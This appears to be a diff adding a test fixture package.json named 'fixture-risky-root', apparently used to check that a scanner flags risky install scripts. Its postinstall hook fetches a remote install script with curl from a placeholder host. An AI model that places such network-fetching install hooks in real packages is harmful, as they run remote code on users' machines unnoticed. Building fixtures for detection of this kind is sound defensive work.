@@ -1,0 +1,1 @@
+{"dependencies":{"alpha":"1.0.0"},"name":"fixture-risky-root","private":true,"scripts":{"postinstall":"curl https://example.invalid/install.sh"},"version":"1.0.0"}
